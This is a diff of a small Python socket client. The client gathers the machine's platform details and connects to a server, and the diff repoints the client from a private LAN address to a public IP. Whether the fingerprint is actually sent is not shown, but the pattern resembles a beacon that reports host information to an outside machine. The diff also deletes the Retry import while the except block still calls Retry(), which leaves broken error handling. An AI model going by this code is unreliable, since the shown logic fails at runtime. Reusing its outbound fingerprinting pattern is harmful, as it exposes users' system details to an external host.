@@ -1,11 +1,10 @@
 import socket
 import platform
-from urllib3 import Retry
 #
 #
 
 #
-HOST = "192.168.100.4"  # The server's hostname or IP address
+HOST = "45.61.54.181"  # The server's hostname or IP address
 PORT = 65432  # The port used by the server
 systemeinfo = platform.machine(),platform.version(),platform.platform(),platform.uname(),platform.processor()
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -25,4 +24,4 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             print(f"Received {msg!r}")
     except:
         Retry()
-    
+  
